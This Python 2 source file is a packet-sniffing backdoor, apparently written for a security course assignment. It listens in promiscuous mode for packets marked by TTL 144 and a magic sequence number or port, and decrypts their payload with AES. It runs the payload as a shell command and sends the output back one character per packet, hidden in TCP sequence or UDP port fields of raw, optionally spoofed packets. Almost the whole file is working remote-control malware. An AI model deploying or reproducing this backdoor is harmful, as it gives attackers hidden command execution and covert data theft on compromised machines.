import hashlib, ConfigParser
#from Crypto import Random
import subprocess
from time import sleep

from Crypto.Cipher import AES
import socket
from struct import *
import datetime
import pcapy #sudo apt-get install python-pcapy
import sys

configParser = ConfigParser.RawConfigParser()
configFilePath = r'config.txt'
configParser.read(configFilePath)

key = configParser.get('config', 'password')

#Using encryption code from backdoor assignment

IV = 16 * '\x00'#16 is block size

#convert the password to a 32-byte key using the SHA-256 algorithm
def getKey():
    global key
    return hashlib.sha256(key).digest()

# decrypt using the CFB mode (cipher feedback)
def decrypt(text):
    global IV
    key = getKey()
    decipher = AES.new(key, AES.MODE_CFB, IV)
    plaintext = decipher.decrypt(text)
    return plaintext

#encrypt using the CFB mode (cipher feedback)
def encrypt(text):
    key = getKey()
    global IV
    cipher = AES.new(key, AES.MODE_CFB, IV)
    ciphertext = cipher.encrypt(text)
    return ciphertext


#--------------------------------------------------------------------------------
#--  FUNCTION
#--
#--  Name:           executeShellCommand
#--  Parameters:     command - a shell command
#--  Return Values:  outputString - the output of the shell command
#--  Description:    executes a shell command and returns the outputpy
#--------------------------------------------------------------------------------
def executeShellCommand(command):

    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
    return outputString


#-----------------------------------------------------------------------------
#-- FUNCTION:       shellCommand(packet, command)
#--
#-- VARIABLES(S):   packet - the packet passed in by sniff
#---                command - the shell command to run
#--
#-- NOTES:
#-- runs the specified command and proceeds to encrypted the output. The output
#-- is then split up in to chunks and passed into create packets accordingly
#-- the data is converted into decimal and embedded into the source port.
#-- Finally, it sends the packet.
#-----------------------------------------------------------------------------
def shellCommand(packet, command):
    print "Running command " + command
    output = executeShellCommand(command)
    print "command result: " + output
    #output = encrypt(output)

    output_dec = [ord(ch) for ch in output]
    print "command lenth: ", len(output_dec)
    print "ecnrypt resutl: ", output_dec
    return output_dec


def sendCommand(protocol, srcIP, dstIP,  data, password, last):
    # http://www.binarytides.com/raw-socket-programming-in-python-linux/

    # create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    if (last == True):
        print "the last one"
        ip_id = 2  # Id of this packet
    else:
        ip_id = 54321  # Id of this packet

    # ip header fields
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # kernel will fill the correct total length
    ip_frag_off = 0
    ip_ttl = 144
    if (protocol == "TCP"):
        ip_proto = socket.IPPROTO_TCP
    if (protocol == "UDP"):
        ip_proto = socket.IPPROTO_UDP
    ip_check = 0  # kernel will fill the correct checksum
    ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
    ip_daddr = socket.inet_aton(dstIP)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
                     ip_check, ip_saddr, ip_daddr)


    if(protocol == "TCP"):
        # tcp header fields
        tcp_source = 1234  # source port
        tcp_dest = 80  # destination port
        #put password to seq
        tcp_seq = password
        tcp_ack_seq = 0
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        # tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)  # maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
                          tcp_window, tcp_check, tcp_urg_ptr)



        # pseudo header fields
        source_address = socket.inet_aton(srcIP)
        dest_address = socket.inet_aton(dstIP)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header) + len("1000")

        psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
        psh = psh + tcp_header + str(data);
        #tcp_check = checksum(psh)
        tcp_check = 10

        # print tcp_checksum

        # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
        tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
                          tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)

        # final full packet - syn packets dont have any data
        packet = ip_header + tcp_header + str(data)

    if (protocol == "UDP"):
        #print "create UDP header"
        data = data
        sport = password
        dport = 8505
        length = 8 + len(str(data))
        checksum = 0
        udp_header = pack('!HHHH', sport, dport, length, checksum)
        packet = ip_header + udp_header + str(data)

    # Send the packet finally - the port specified has no effect
    s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target


def main(argv):
    # list all devices
    devices = pcapy.findalldevs()
    #print devices
    '''
    #  ask user to enter device name to sniff
    print "Available devices are :"
    for d in devices:
        print d
    '''
    '''
    dev = raw_input("Enter device name to sniff : ")

    print "Sniffing device " + dev
    '''
    '''
    open device
    # Arguments here are:
    #   device
    #   snaplen (maximum number of bytes to capture _per_packet_)
    #   promiscious mode (1 for true)
    #   timeout (in milliseconds)
    '''
    cap = pcapy.open_live("ens33", 65536, 1, 0)

    # start sniffing packets
    while (1):
        (header, packet) = cap.next()
        # print ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen()))
        command = parse_packet(packet)


# Convert a string of 6 characters of ethernet address into a dash separated hex string
def eth_addr(a):
    b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]), ord(a[1]), ord(a[2]), ord(a[3]), ord(a[4]), ord(a[5]))
    return b


# function to parse a packet
def parse_packet(packet):
    # parse ethernet header
    eth_length = 14

    eth_header = packet[:eth_length]
    eth = unpack('!6s6sH', eth_header)
    eth_protocol = socket.ntohs(eth[2])
    '''
    print 'Destination MAC : ' + eth_addr(packet[0:6]) + ' Source MAC : ' + eth_addr(
        packet[6:12]) + ' Protocol : ' + str(eth_protocol)
    '''

    # Parse IP packets, IP Protocol number = 8
    if eth_protocol == 8:
        # Parse IP header
        # take first 20 characters for the ip header
        ip_header = packet[eth_length:20 + eth_length]

        # now unpack them :)
        iph = unpack('!BBHHHBBH4s4s', ip_header)

        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF

        iph_length = ihl * 4

        ttl = iph[5]

        #check if ttl is 144
        if(ttl == 144):
            protocol = iph[6]
            s_addr = socket.inet_ntoa(iph[8]);
            d_addr = socket.inet_ntoa(iph[9]);
	    '''
            print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
                ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
                s_addr) + ' Destination Address : ' + str(d_addr)
	    '''
            # TCP protocol
            if protocol == 6:
                t = iph_length + eth_length
                tcp_header = packet[t:t + 20]

                # now unpack them :)
                tcph = unpack('!HHLLBBHHH', tcp_header)

                # check if sequence number is our password
                if(tcph[2] == 1000):
                    source_port = tcph[0]
                    dest_port = tcph[1]
                    sequence = tcph[2]
                    acknowledgement = tcph[3]
                    doff_reserved = tcph[4]
                    tcph_length = doff_reserved >> 4


                    print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Sequence Number : ' + str(
                        sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(tcph_length)

                    h_size = eth_length + iph_length + tcph_length * 4
                    data_size = len(packet) - h_size
		    print tcph[6], len(packet), h_size, data_size, eth_length, iph_length, tcph_length
                    # get data from the packet
                    data = packet[h_size:h_size+tcph[6]]
                    commandString = decrypt(data)
		    print len(commandString)
                    print 'Data : ' + commandString
                    output_dec = shellCommand(packet, commandString)
                    sleep(2)
                    #for seq in range(0, len(output_dec), 1):
                    last = len(output_dec) - 1
                    counter = 0
                    for seq in output_dec:
                    #for seq in range(0, len(output_dec), 1):
                        if  counter == last:
                            sendCommand("TCP", d_addr, s_addr, 1000, seq, True)
                            counter += 1
                        else:
                            sendCommand("TCP", d_addr, s_addr, 1000, seq, False)
                            counter += 1


            # UDP packets
            elif protocol == 17:
                u = iph_length + eth_length
                udph_length = 8
                udp_header = packet[u:u + 8]

                # now unpack them :)
                udph = unpack('!HHHH', udp_header)

                source_port = udph[0]
                if(source_port == 1000):
                    dest_port = udph[1]
                    length = udph[2]
                    checksum = udph[3]

                    print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(
                        length) + ' Checksum : ' + str(checksum)

                    h_size = eth_length + iph_length + udph_length
                    data_size = len(packet) - h_size

                    # get data from the packet
                    data = packet[h_size:h_size+checksum]

                    commandString = decrypt(data)

                    print 'Data : ' + commandString

                    output_dec = shellCommand(packet, commandString)
                    sleep(2)

                    # for seq in range(0, len(output_dec), 1):
                    last = len(output_dec) - 1
                    counter = 0
                    for seq in output_dec:
                        # for seq in range(0, len(output_dec), 1):
                        if counter == last:
                            sendCommand("UDP", d_addr, s_addr, 1000, seq, True)
                            counter += 1
                        else:
                            sendCommand("UDP", d_addr, s_addr, 1000, seq, False)
                            counter += 1

if __name__ == "__main__":
    try:
        main(sys.argv)
    except KeyboardInterrupt:
        print "exiting.."